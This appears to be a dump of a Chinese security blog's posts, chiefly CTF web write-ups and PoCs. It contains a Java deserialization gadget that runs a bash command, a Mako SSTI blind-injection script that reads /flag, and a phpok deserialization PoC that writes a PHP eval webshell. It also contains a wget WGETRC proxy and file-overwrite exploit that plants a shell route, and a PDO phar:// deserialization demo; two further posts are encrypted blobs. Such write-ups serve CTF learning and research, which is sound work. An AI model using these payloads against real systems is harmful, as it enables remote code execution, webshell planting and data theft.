sL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAGPGluaXQ%2bAQADKClWBwAmAQAKU291cmNlRmlsZQEACWV2aWwuamF2YQwAGQAaBwAnDAAoACkBABBiYXNoIC90bXAvc3VhbnZlDAAqACsBAARldmlsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAAMAAsAAAAgAAMAAAABAAwADQAAAAAAAQAOAA8AAQAAAAEAEAARAAIAEgAAAAQAAQATAAEABwAUAAIACQAAAEkAAAAEAAAAAbEAAAACAAoAAAAGAAEAAAAOAAsAAAAqAAQAAAABAAwADQAAAAAAAQAOAA8AAQAAAAEAFQAWAAIAAAABABcAGAADABIAAAAEAAEAEwABABkAGgACAAkAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACgAAAA4AAwAAABAABAAUAA0AFgALAAAADAABAAAADgAMAA0AAAASAAAABAABABsAAQAcAAAAAgAdcHQAEkhlbGxvVGVtcGxhdGVzSW1wbHB3AQB4dXIAEltMamF2YS5sYW5nLkNsYXNzO6sW167LzVqZAgAAeHAAAAABdnIAHWphdmF4LnhtbC50cmFuc2Zvcm0uVGVtcGxhdGVzAAAAAAAAAAAAAAB4cHNyABFqYXZhLnV0aWwuVHJlZU1hcAzB9j4tJWrmAwABTAAKY29tcGFyYXRvcnQAFkxqYXZhL3V0aWwvQ29tcGFyYXRvcjt4cHB3BAAAAAB4eHQAAzEyM3g%3d 反序列化 baby gadget v2.0’ revengeStatus: CompletedTag: WEB 相关资料/地址 同上题 HTML practicemako ssti 不出网盲注 123% for i in range(0,self.module.runtime.util.os.system(set(pageargs.values()).pop())):123% endfor 当命令执行成功 则显示123 否则 显示多个123 123456789101112131415161718192021222324import requestsimport stringimport urllib.parseurl=&quot;http://124.71.178.252/view/vnA8UID0QS7X2FtwsBTop15HNm6hfzbx.html?name=&quot;payload1=&quot;sleep $(cat /flag|base64 -w0|cut -c {}|tr {} 5)&quot;payload1 =&quot;&quot;&quot;if [ $(printf &quot;%d&quot; &quot;'$(cat /flag|cut -c {})&quot;) -eq {} ];then sleep 3;fi&quot;&quot;&quot;# payload2=&quot;if test $(cat /flag|cut -c {}) = {};then sleep 3;fi&quot;s=string.ascii_letters+string.digits+'{@~^*_+-\\'\\&quot;?/\\\\&lt;&gt;}'# s = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;flag=''for i in range(7,100): f=flag for j in range(48,128): try: u=url+urllib.parse.quote(payload1.format(str(i),j)) r=requests.get(u,timeout=1.8) except requests.exceptions.ReadTimeout as e: flag=flag+chr(j) print(chr(j)) break if f==flag: breakprint(flag) 断断续续跑n次","link":"/2022/03/01/SUSCTF2022-web-writeup/"},{"title":"phpok6.0-前台反序列化漏洞getshell","text":"0x0 前言这两天来杭州打西湖论剑了，一个低版本的phpok一个高版本的phpok 低版本nday通了 高版本一直没审计出来 今天上午在安恒大厦听了讲解 主办方说不公开了 但是有人做出来了 互联网上很快就会有题解了。 看到了poc大概的样子 回合肥路上调了一下 0x1 避坑最新版的phpok直接搭建跑不起来 可能是因为我mac？ 复现的师傅们可以把这里注释一下（我懒 不想找原因 0x2 思路大概看了一下逻辑 这个框架 c是控制器 f是方法 代码都在framework 文件夹下面，如图 framework/admin/login_control.php的 index_f方法 对应的url就是 /admin.php?c=login&amp;f=index 主办方那个url我看到了 是admin.php?c=login&amp;f=update 跟进去看了一眼代码 可疑点就在decode 跟进发现反序列化 。。。简单的有点离谱 还是吃了习惯看前台控制器的亏…. 以后多细心点吧 （此处响起了k👴👴r的声音：你为什么不会？还不是因为你菜 0x3 poc把token和file对应的文件复制过来 1234567891011121314151617181920&lt;?phprequire &quot;./token.php&quot;;require &quot;./file.php&quot;;class cache{ protected $key_id='suanve'; protected $key_list='aaaaaIDw/cGhwIGV2YWwoJF9QT1NUW29zd29yZF0pOz8+'; protected $folder='php://filter/write=string.strip_tags|convert.base64-decode/resource=';}//echo base64_encode(serialize(new cache()));$token = new token_lib();$file = new file_lib();$keyid = $file-&gt;cat(&quot;./index.php&quot;);$token-&gt;keyid($keyid);echo $token-&gt;encode(new cache()); 上车的时候掏电脑开始看的,写好这篇博客到丽水站了….比赛的时候我可是审到早上3点啊….","link":"/2022/03/13/phpok6-0-%E5%89%8D%E5%8F%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Egetshell/"},{"title":"dash分析-0x0环境搭建","text":"0x0前言虎符比赛遇到了一题极其类似p神做过的题，只是底层操作系统是Debian，无法使用p神的思路解决。 本着遇到了就调一调的精神 尝试了一下调试 验证p神的操作 也试着“完成p神未完成之路” 调试所需环境: Macos CLion Vscode php 1&lt;?php (empty($_GET[&quot;env&quot;])) ? highlight_file(__FILE__) : putenv($_GET[&quot;env&quot;]) &amp;&amp; system('echo hfctf2022');?&gt; nginx/default.php 1234567891011121314server { listen 80 default_server; listen [::]:80 default_server; root /var/www/html; index index.html index.htm index.nginx-debian.html; server_name _; location / { try_files $uri $uri/ =404; } location ~ \\.php$ { include snippets/fastcgi-php.conf; fastcgi_pass 127.0.0.1:9000; }} Dockerfile 1234567891011121314151617181920212223FROM php:7.4.28-fpm-busterLABEL Maintainer=&quot;yxxx&quot;ENV REFRESHED_AT 2022-03-14ENV LANG C.UTF-8RUN sed -i 's/http:\\/\\/security.debian.org/http:\\/\\/mirrors.163.com/g' /etc/apt/sources.listRUN sed -i 's/http:\\/\\/deb.debian.org/http:\\/\\/mirrors.163.com/g' /etc/apt/sources.listRUN apt upgrade -y &amp;&amp; \\ apt update -y &amp;&amp; \\ apt install nginx -yENV DEBIAN_FRONTEND noninteractiveCOPY index.php /var/www/htmlCOPY default.conf /etc/nginx/sites-available/defaultCOPY flag /flagEXPOSE 80CMD php-fpm -D &amp;&amp; nginx -g 'daemon off;' 0x1源码获取https://command-not-found.com/ 这个网站可以输入命令来获取该命令对应的软件包 比如我们输入echo 可以发现网站提示了在各种编程语言下获取该软件的方式 因为赛题环境是debian我们前往Debian Package搜索coreutils 搜索后会发现Debian Package提供了完整匹配和部分匹配的软件包地址 点击完整匹配对应的软件包路径 可以看到网站右侧即可下载源码 如果我们想确定我们目标环境中coreutils的版本 可以使用dpkg -l的方式来检索软件包版本 0x2dash调试环境搭建dash源码获取途径如0x1节 解压后进入目录 cd /Users/su/Desktop/code/c/dash-0.5.10.2/ 我们首先编译dash 并添加调试符号 123CFLAGS=&quot;-g&quot; ./configure --prefix=/Users/su/Desktop/code/c/dash-0.5.10.2/ &amp;&amp; \\make &amp;&amp; \\make install 等待编译完成后在当前目录下会出现bin目录 目录中存放着dash的可执行文件 运行一下测试 我们需要在vscode中安装c/c++扩展 随后在Debug菜单中选择创建launch.json 然后选择C++(GDB/LLDB) 在生成的json文件中添加调试信息 1234567891011121314151617181920212223242526{ // 使用 IntelliSense 了解相关属性。 // 悬停以查看现有属性的描述。 // 欲了解更多信息，请访问: https://go.microsoft.com/fwlink/?linkid=830387 &quot;version&quot;: &quot;0.2.0&quot;, &quot;configurations&quot;: [{ &quot;name&quot;: &quot;Debug&quot;, &quot;type&quot;: &quot;cppdbg&quot;, &quot;request&quot;: &quot;launch&quot;, &quot;program&quot;: &quot;/Users/su/Desktop/code/c/dash-0.5.10.2/bin/dash&quot;, //这里指向编译好的文件 &quot;args&quot;: [ // 这里是运行时的参数。因为赛题执行了dash -c 'echo xxxx' 所以需要配置一下 &quot;-c&quot;, &quot;echo suanve&quot; ], &quot;stopAtEntry&quot;: false, &quot;cwd&quot;: &quot;${fileDirname}&quot;, &quot;environment&quot;: [ { &quot;name&quot;: &quot;test&quot;, &quot;value&quot;: &quot;test&quot; }, ], &quot;externalConsole&quot;: false, &quot;MIMode&quot;: &quot;lldb&quot; }]} 配置完成保存 打开src/main.c找到主函数下一个断点 点击调试即可断在main函数","link":"/2022/03/21/dash%E5%88%86%E6%9E%90-0x0%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"title":"*CTF2022-web-writeup","text":"周末看了*ctf2022的题目 web依旧没活硬整 总体打个3🌟吧这里写一个我觉得还蛮有意思的oh-my-lotto题其他题解请移步EDI安全公众号 oh-my-lotto前面就是基础的pytho代码阅读有两个服务 一个是web竞猜 一个是生成竞猜数据功能点： 在web竞猜服务上传一个文件 内容为你猜的数值 设置一次环境变量 web竞猜服务通过wget请求http://lotto/ 如果你上传的文件内容和随机生成的竞猜数据相同即可获得flag 既然可以设置环境变量就和p牛的那个题思路差不多了 下载wget源码查看所有可以利用的环境变量(搜索getenv 很容易发现了一个RC结尾的变量WGETRC查看wget的帮助文档可以发现该变量用于加载配置文件 配置文件格式与wget命令一致 题目过滤了proxy不能修改系统变量实现代理 但是我们还是可以使用配置文件加载代理 所以我们上传一个内容为代理配置的文件 让wget设置该代理 就可以在本地拦截题目内部对lotto的请求，这样修改返回包内容即可获取flag 我们首先把本地的burp转发到服务器上 ssh -p 22 -f -g -C -N -R 8080:127.0.0.1:8080 root@120.26.59.137 因为服务器请求的是http://lotto我们在本地也添加一条host解析 这样就不用手动改包了 接着启动一个web服务 返回代理配置 123456789101112131415161718192021from flask import Flask, make_responseimport secretsapp = Flask(__name__)@app.route(&quot;/&quot;)def index(): lotto = [] for i in range(1, 20): n = str(secrets.randbelow(40)) lotto.append(n) r = '\\n'.join(lotto) r = &quot;http_proxy=http://120.26.59.137:8080&quot; response = make_response(r) response.headers['Content-Type'] = 'text/plain' response.headers['Content-Disposition'] = 'attachment; filename=lotto_result.txt' return responseif __name__ == &quot;__main__&quot;: app.run(debug=True, host='0.0.0.0', port=80) 题目需要输入md5的值才可以启动环境 简单爆破一下md5 随后针对题目上传文件 指定代理为我的服务器 123456789101112131415161718192021222324252627POST /forecast HTTP/1.1Host: 121.36.217.177:53002User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=---------------------------2363992665965896981350789360Content-Length: 249Origin: http://127.0.0.1:8880Connection: closeReferer: http://127.0.0.1:8880/forecastUpgrade-Insecure-Requests: 1Sec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: same-originSec-Fetch-User: ?1X-Forwarded-For: 1.1.1.1X-Originating-IP: 1.1.1.1X-Remote-IP: 1.1.1.1X-Remote-Addr: 1.1.1.1-----------------------------2363992665965896981350789360Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;2.jpg&quot;Content-Type: image/jpeghttp_proxy=http://120.26.59.137:8080-----------------------------2363992665965896981350789360-- 接着修改环境变量WGETRC指向刚刚上传的文件 使wget加载代理请求http://lotto 返回内容为代理配置内容 getflag 123456789101112131415161718192021222324252627282930POST /lotto HTTP/1.1Host: 121.36.217.177:53002 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=---------------------------134338874213176516492993923776Content-Length: 324Origin: http://127.0.0.1:8880Connection: closeReferer: http://127.0.0.1:8880/lottoUpgrade-Insecure-Requests: 1Sec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: same-originSec-Fetch-User: ?1X-Forwarded-For: 1.1.1.1X-Originating-IP: 1.1.1.1X-Remote-IP: 1.1.1.1X-Remote-Addr: 1.1.1.1-----------------------------134338874213176516492993923776Content-Disposition: form-data; name=&quot;lotto_key&quot;WGETRC-----------------------------134338874213176516492993923776Content-Disposition: form-data; name=&quot;lotto_value&quot;/app/guess/forecast.txt-----------------------------134338874213176516492993923776-- oh-my-lotto-revenge和出题人沟通后 证实了我那个思路是非预期 晚点的时候上了revenge在revenge中 修改了flag获取条件 需要rce（出题人为了照顾第一个题使其不烂掉 还是没有ban WGETRC 这就给了我很大的操作空间 首先我们要知道 wget参数可控的情况下有哪些可利用的参数 文件读取 指定输出文件 设置代理…我们留意一下出题人使用的参数 --content-disposition 当选择本地文件名时允许 Content-Disposition -N 只获取比本地文件新的文件 根据lotto服务的返回我们可以发现response.headers['Content-Disposition'] = 'attachment; filename=lotto_result.txt' 所以我们可以修改filename的值 让他覆盖当前目录下的任意文件细心点可以发现出题人把web服务的debug打开了 所以可以直接使用代理来替换app.py(赛后看到有的师傅是修改模板文件 思路都一样 123456789101112131415161718192021222324252627from flask import Flask, make_responseimport secretsapp = Flask(__name__)@app.route(&quot;/&quot;)def index(): lotto = [] for i in range(1, 20): n = str(secrets.randbelow(40)) lotto.append(n) r = '\\n'.join(lotto) # r = &quot;http_proxy=http://120.26.59.137:8080&quot; r = open(&quot;exp1.py&quot;,'r').read() response = make_response(r) response.headers['Content-Type'] = 'text/plain' response.headers['Content-Disposition'] = 'attachment; filename=app.py' return responseif __name__ == &quot;__main__&quot;: app.run(debug=True, host='0.0.0.0', port=80)# 主要就是shell路由# @app.route(&quot;/edi&quot;, methods=['GET', 'POST'])# def index():# return os.popen(request.query_string.get('edi')).read() 出题人用的是gunicorn来保持python运行 不会及时的重载 但我们还是可以使用bp拦截数据包 直到gunicorn重启worker 你要做的就是不停的请求shell路由 留给读者的问题环境变量可控注入的情况下system执行wget能rce么?","link":"/2022/04/18/*CTF202-lotto-writeup/"},{"title":"PDO-dsn_from_uri-phar反序列化","text":"0x0 前言X月受邀给某春秋出题，因为没有这么多时间去研究点好玩的新技术，就随便把之前发现的phar利用点给出成了题。 最终整场比赛1解( 做出来的师傅不多 可能题目设计的不是很好 在这里给师傅们道个歉 轻点骂 什么垃圾题目 0x1 sql_debug题目介绍在这次2022年春秋杯联赛中，我出了一道sql_debug赛题。本题环境是Nette Web，一个PHP框架应用。 我在环境里放了一个install.php可以修改框架的配置文件 在控制器中呢也可以看到存在一个SQL注入的方法 我在环境里没有放置mysql 所以sql注入这个地方是行不通的。 在高版本php里即使是在数据库配置可控的情况下尝试使用恶意mysql服务器读取文件也是不可以的。 选手们到这里就应该思考 在配置文件可控的情况下有什么办法接管服务器了。 结合题意我们可以对Nette的数据库初始化代码进行分析，你可以发现数据库是使用pdo进行连接的。 source/vendor/nette/database/src/Database/Connection.php 我们知道myqsl和 pdo都有phar利用，不幸的是这两个利用方式都无法在本题中使用。 Postgres 1234&lt;?php$pdo = new PDO(sprintf(&quot;pgsql:host=%s;dbname=%s;user=%s;password=%s&quot;, &quot;127.0.0.1&quot;, &quot;postgres&quot;, &quot;sx&quot;, &quot;123456&quot;));@$pdo-&gt;pgsqlCopyFromFile('aa', 'phar://test.phar/aa'); MySQL 1234567891011&lt;?phpclass A { public $s = ''; public function __wakeup () { system($this-&gt;s); }}$m = mysqli_init();mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true);$s = mysqli_real_connect($m, 'localhost', 'root', '123456', 'easyweb', 3306);$p = mysqli_query($m, 'LOAD DATA LOCAL INFILE \\'phar://test.phar/test\\' INTO TABLE a LINES TERMINATED BY \\'\\r\\n\\' IGNORE 1 LINES;'); 那么有没有一种可能，还有其他的phar利用方式呢？ 0x2 dsn_from_uri 触发phar反序列化我们跟进php源码 搜索phar反序列化的入口函数可以发现在pdo_dbh.c中存在这调用 跟进该函数 可以发现直接调用了实参uri 查找dsn_from_uri发现只有一地方存在调用，即static PHP_METHOD(PDO, dbh_constructor) 我们在php的官网可以找到uri:的相关解释 dsn由uri组成:后面跟着一个定义包含dsn字符串的文件位置的uri。URI可以指定本地文件或远程URL。 所以我们可以通过uri:phar://phar.phar的方式触发phar反序列,demo如下: 1234567891011121314151617&lt;?phpinclude_once &quot;classTest.php&quot;;$dbms='mysql'; $host='localhost';$dbName='test';$user='root'; $pass='';$dsn=&quot;uri:phar://phar.phar/$dbms:host=$host;dbname=$dbName&quot;;try { $dbh = new PDO($dsn, $user, $pass); $dbh = null;} catch (PDOException $e) { die (&quot;Error!: &quot; . $e-&gt;getMessage() . &quot;&lt;br/&gt;&quot;);}$db = new PDO($dsn, $user, $pass, array(PDO::ATTR_PERSISTENT =&gt; true));?&gt; 到这里这道题的解法就非常明朗了，接下来只需要挖一条Nette的链子写入install.lock打Phar就好。 链子非常简单 我就不写了 0x3 Linux下PHP内核调试小知识想起来再补 vscode的调试配置文件里 可以把参数配置为-S这样就可以启动web服务，非常的方便调试。 12345678910111213141516{ // 使用 IntelliSense 了解相关属性。 // 悬停以查看现有属性的描述。 // 欲了解更多信息，请访问: https://go.microsoft.com/fwlink/?linkid=830387 &quot;version&quot;: &quot;0.2.0&quot;, &quot;configurations&quot;: [{ &quot;name&quot;: &quot;(lldb) Debug&quot;, &quot;type&quot;: &quot;cppdbg&quot;, &quot;request&quot;: &quot;launch&quot;, &quot;program&quot;: &quot;/usr/local/php7.1.33/bin/php&quot;, &quot;args&quot;: [&quot;-S&quot;,&quot;0:10001&quot;], &quot;stopAtEntry&quot;: false, &quot;cwd&quot;: &quot;${workspaceRoot}/html/&quot;, } ]} 0x4 个人总结 鸡肋 只适合CTF 互联网没看到有人发 算是一个新的知识点 0x5 招聘!!!你是否想要加入一个安全团队? 拥有更好的学习氛围？ 那就加入EDI安全，这里门槛不是很高，但师傅们经验丰富，可以带着你一起从基础开始，只要你有持之以恒努力的决心 EDI安全的CTF战队经常参与各大CTF比赛，了解CTF赛事，我们在为打造安全圈好的技术氛围而努力，这里绝对是你学习技术的好地方。这里门槛不是很高，但师傅们经验丰富，可以带着你一起从基础开始，只要你有持之以恒努力的决心，下一个CTF大牛就是你。 欢迎各位大佬小白入驻，大家一起打卡CTF，一起进步。 我们在挖掘，不让你埋没！ 你的加入可以给我们带来新的活力，我们同样也可以赠你无限的发展空间。 有意向的师傅请看下列联系方式 邮箱 root@edisec.net （带上自己的简历，简历内容包括自己的学习方向，学习经历等） EDI安全 微信公众号留言","link":"/2022/05/09/PDO-dsn_from_uri-phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"title":"帆软v10后台getshell","text":"dd33c9633a7ff862cbad5f8abcc53da0af680792b523f8930a332c1c494080e961d29b79bbf78c41a61c37ca9822041f02f3594b616ec71fdecd056562989f852ebf2f4e50bf38ac22458d2687f12f86fd2b3b10c28805235f1dd6721ceba8d67e51519c2318ef121366b9f5b66a4cf8491b5329b6bf335081cad1e17668c1c9ecdc458badd341258afce571292ec0110663b2eab0518507d60a4e9813e51a2fc81403a966ababda39bd6294d61d92e93e0e46f9c0db947e778f6760c2ba61a826b0b00c8c031b76c6fe1dd727d6ab414453b046044f230f8e39c21f24eac1322a0ea6d161696b168f2690b8c06f6d58f5a8d34df04f41c9d97bfcb1fd7e10b8c353fd6779a9f5ea0b447924e9aa6668a6c131295e0fe7370675d0371a127b5d03251f08d609d9d916f1077bc7b5803f0a0418355b6bdf23a052ce89470e9b97b3500baca25d6cfbc60ad9ef570bcadbce369d83b05d73fdc3519fbc46dd75553da251ee2061e06094f71bb930abb287e14d5723d46c83b92912172eae678ede05881e56fc1c87767f0601180c53d34c510569a0a20a98efe9b154219f7aac115f52dbe834bd43d15a6a8f4d98d2b58b9461c755102ff3b1fbe5b7ce897a6f17557566670e87ef704ca5d0faa426cba1ebb9d84cd461856438965e810507aaa9f6b27029143c9f6afea216c75410c07abaef07b64480bdf3725e305217cdd436d3d66056ba105fa57e07fbf4d0c2005ed1e4c88e46a3072e1dad59261fff5ea9e5fb8b128f9993ea35b69713cfc2c3ef457e16d05f2445912cc351d127968730c40fee9ca71afbc153c2fad1c92662592f19fe90efb05cfd45de7be0d948015dfaef80b2b0179d4f4a56e3f8671746d8a63babc6cfeb54c439289e6d8763da1ab3788085e310aaec46937e5e3f5aae5a98feb5a15b4e158ab074510f381c0f681ae12e054cd767b71fcf98a0ef1ca0eef80fbd3d77cc63bc7b3d20be3ae6412143011734fdcb8ac1ad140e510e57065ff88f5c6598ef62b764d68ae83aaa60d50b7e32a22b415f68eca6749893d25e6e81ae800be07d8bd9e8370f8418c61dedf14df3a440cd68c0ad38e1449012e9e072fe6c8817a72f99629530d51932b5cc96a64a8ac8db732272a4eb4ce00ffc056f0545983b92c33836a79f567c836e0208a6296abefc3607592cd6102a83bb4a030a5dd744805af7bc2c82da210cbbfd490c16c0d14003503eab9f19cc88d076a145f5b0551cefadf18273f7099cf2d4b6cce99f8a0e0ec1ddc0288c946d90f8907d2a3a266a91f45f130626dabb1d5be673963c8b24fecc1abad4ea750388820a5e6027e4229e4e7f5ef6e95655ebc64aebaef8d5fb9afe1f0cf5e3491cd0d81b784d85204fd31467ed6568fda4bb53048109bda3f3ace69e39e4d3e935241e6d34d9690183dbe66abae52dade48881a981ab4bb2801dd387268d807bb9391101b7ec43ce91b1cf8d10db3ae99fbaa56174f08c5e3ed4a85bc80756f160d427879b820ab7bb24309c00b5782cdb1fdfd5bd868089bf82ef69432c6f0b809e3d2dc9d1f39c8ea5ffd56099130b1be8a7db678dfe9376ff37b9068e092b1a4c992a910e4865be8f265203c2ba490015f3ade7ff7b878f7f45d67fed1215b4d98a91c1ebf97a01dc9c5fe0e58684e1462fe7ffd41071429256645b1a0949acb84d26ba9447a5b306cbdf3429cf7cc6373b57c11dfc544a503994e6974c86e8a163ace0720ed59d25542bd7a6bec40dc4fc46f4e9af4a932908b79b23bc9e3bf6410e9b5928a3f661d1195ef4b547111c0ba7bb1a9950b0d8c962bc98de912d28a7284cfaf9dbadcd6a32e4420696fe16115dc697af645bee866ec7742935729199372f65fdfe073659f6bc2cdf8aa3e61466d0c5552658815aa828375f83f75a8242111da1b480aa4f7ddb770e5545a540ccd1df0b45f22c4a54edd8c0d457ce5930663bffb569f549a21e8ee81e2a9bd1e94c893d6b1de638cb386ffd80b373589441f42bf4e6d1a0a4d09ba1b637f2019407123cef2a6e6b97cdf2c6b9f8053b50611f6b299d0221a825c9783bd39ced83267fb5caa3ca9558ad09f3707da33e6a8a321c6c36c5b217965b86bc8c77b0cfbe8cf3af47fe3b6c4f5903662c1646d0aa7736fc38a363d062e0797b582e84923c000ddc90d86edd1b288a9cad5a986398bcdd510f154bb911b2e7c73066162f2d5dbd0883e6a92866f8b6b132366fcb981d1249a1dc05a881ac413d162201c4459568eb096fdd61c3ba96d7867544624d29fd7dec4c7a37fbca1b01839a66393e737a5aa6b784c51bf609a96b2566ca306408271d8e41941bb74a61af6bc2568d196584d450a7a5172ce74028dceeaa9e74285298dbbda07b1023355b7100f040eef8954b3007ec8866d88096e8092a0c5b5e943551640df3027b644f99fca9e76d4df320222f158c61ede4dbaf32d203966efb20f80f67822330b72663c6ce7b06daf9b2886a75ec25fbb7406b01f27888f25f617d7cf23301c36eb8d287dff094e853f6e323e41653027691c02723fba804a7e522fdf7b4b41ac486ee0c0928e09edb28b1b56fd90155bc05ca8be4942a203345ea4590c1f24269eeafdf1576ac0d39e1f1a3b20944fe67d45db5d2a6a3b67db3495ab0110360b95faab65660e3dc81c958ec7001118f7803d965c05ee42b073d80b5b322309b6bc04ca2801e7d7eace83ac2083cdf61941deac2853ee80e49e68d81d86a08b7f2b5ee89d8fc8c04d43aa22f89da5e0dbdf660f81e2b6bba4bca78118ab3ffd8ed49383efe2427be983a0de35b686f4263fc6e6575ecbf2cce32b51559fd09b27d3bb7095d4e47bb4e6e9d47a2821051a02355c3601d0b0636a5aeed265e35c2882ddf6f6c4a4f34d2f007de68b6dd73bebea2ace2b3fb2febb28a43bca285e10f0cc43a1113d749614cb439039e2d3a4446076d8477b70fd59044f13a11abeccc9b70c8e67941a5220471080385a2fa804a10e829f5638acaaba83adc6040189a405b6f702de1c2e4d05d64133635670a35deb9964ae9a5410114f79db4751e67b9bc0e72b61b32529716f2af1731b199e8d49735e4cf268e39620f6f19705bb53941e9fa0529fff8ac658ae1e377e190807775a577a2d235dfc57c2623565013710eca70b4f834e8c3556eb9939ef82d35826344004df51659cfa99c1fe8c8101574a5c005a26baa2e3dbd2bb9e303bfa0d9b00f66815a512ad76aca8e6a323a0f4763a98110f562143fd9f20f7627e13dc69fdb495f5c44000e69c9bc204f3a465adb59596153011eaadca7d591390bf69b5d33d15f25db946d9667243a973c9abd0585ae72d4c5813af41a8db6e2aafdfd9680469987be78651bc617155bd15b3636cc56395e1bbda37499b9202a519d8506e83e02d0737dfbd7472b18e3c7b039b4d7806c9bb7824fdc627d6895287b6c8987b421a5311612128c4cc6e0a686df7858ef34e7439c34673d8f75a9956daa1108b0dbfdd0d55278d927e452c6ff9a44bb2e77133df5032569acd065a6b2203a3c329dda77ac333cb8e208cce1a6e482 Hey, password is required here.","link":"/2022/06/22/%E5%B8%86%E8%BD%AFv10%E5%90%8E%E5%8F%B0getshell/"},{"title":"泛微9.5后台SQL注入","text":"cf3af7e99936e377dafc9340eabe2eadc252652766936e948d7b9ea447664bf7a742a5d0821a1dbfa9890334900aa6502a9d2269692af455c451fbabd6c944e35d439749dbded497840f36de8d14114fe23a78d5557a97ce995c5bd598b473645e1877a355a97f512e614d23c3527543ac5aa30b542ee4cd843b0df78106dce39bf47879f28c6417c344edc8e127bd9e458c8579eaa6c38be09a05e47810df3ec9f1f4154bb3b6e62566c92fde18b677bd778aea4b78b70fa4f6cd59fcecff4d157cf04076e1b230cde16ee7c4be5cb9b86c5c85c56e0968302bf1c1f18dc990f3f47c975a42a997ec06fd5f5d20b6aef2e9062b1bb225c16cc890ce418a9ba302e354d8dd64135596221e2f00d63d2c75ded1d47c27762ea97169ec7180da241047c8b4d283c3e471f1a3ed331c2ad1b125c6ecabb72291505c061aa82d45c4c1ff14f9fc6da0f5da1d602719044afe4d8238a761c8fb330ec833b521b115c6a8edddd5a560f34eb6551ef9704d4ef59df011de63f3452a93e16e4a309ffb5c8cf4b7ff445d2da99b151ee9049dcc2502fe0600cb432a887b8e8b6201847d6eda6dac00b36feee20187ca4c2a716f9ec304ad0a5f8930a10b028076e14d21cfb17621978737ec821b2132c19f327088bc8fd0eb412397987bd648122a6bdee79dbffdd4c4f8f84d2be7c7829961b78c650e9d0ce8ee98960740aac707b078f0cfd38a95c928a15621c0f28ba6f2c930c703d6749e5d29de2fd29aa46dfc5bd86ee6fe60ce5882bc70095db744bfdd1cd75d1b8af83677644f2e06bcec9c5889b9cd094d37d0f531b0008721d7dc1d7e9a14358f23e040c44c3baa9f312046da3fbe4c12beab0607a95e7155ce2d7e744ca53497150903bd0422132a7f6ce8c8263d4d87a10b8e50f694669d7d7586dd591cdfddfaa3fd67209dc68bd62e8453b4b9294d254954450ca54776194e58be46c6f127edc8cae8d79f4ec3531b740cf30931fbbc5af052375a21ea445a1cb6a964e1f21ce7ba955fd69b538902a70920a4a7d850033e6710a750ecc27c5c91aef070eb7b839c2369b366fd42a349f2fff42ca8933a814a21547322a9278b58b50bb5ad04cc3858863a54b80c21261a866693072a29b7a86b6adae20520249e074734e82323b4ccb23ffd3abe04c2c4a54111b1cf136dff92bb44fadf727b574d3fb48a96d68f7c18a364e946abe80fb2226e13ff612bc00175f27ea28d93e110c40618e863ea77c3da71cc664edcefcd0c780af258d5e33fcc239048ee66dd3da54b6f3379fd81ad260442cc410ecd59c7ff481a58b59636a2b861b78b9238d73a257a85aff9e5838b7e1eb19fdbcc2a80ebb9c4766061047f6ce33e11b0b0352a58dbd2325d433b958c8e8634c1a4f8b4b4d3120aaf3a9a9e43b48c8201e67cd1b8ace4d59dbf6244ef923215bd79353a5085fa40515bdb285da8397b7153c7ec2b3ba87306404b6e945451d06b446f1693ada9c137fab4b323aeb421d069af3a6bf4c197f52c451df0268b25ec89ec2f7b69203ad353833cf63c1a4c0745640d6323eae262d8020e55b0547a18b7163d29f9096a6695712e2be5bce8f2b85a562d89c2ee5e51418bd88cab19db1f27de0f10edf45ed7ae29b38c96db2c4480a4e19c9625d8f6974fea5a447eb064267cc577728051e138cd0317ddd641777f093c2510cb86f84a160e40f80a898e8b91d9e6d1b7ec0af2f54847d9f6f938cfb977d6544ae6df422e390af57494962ad6d3a0d71532d1c284cdb53010e881e4986c2b342ce489d8644749d9d6f5962543572988eb6c416dd25b7094022f5cfff670323a47b1cc062ba19ec5fda25cef81edfee7059c076154170f2bf1a1feeb0f7066d3053b245f10904a3b40c4b314359a321d41e66f0331521100285fdae2cd86962bb8905a0fc50cc15dba00d8303d835b709a83bb69072df33fdfb14533529510a1199ece0a53b2b3730f8b0d84cd2a23f9e8ccc69f532c2a0686e1882ee142ecd938f6368611f680ab82fe920b336e5c96a52819431819b83db168eba8e922762978966d1d8c0510081092e59524923ca40f80435784815f96de806390a6c887357d5f90d5b9fc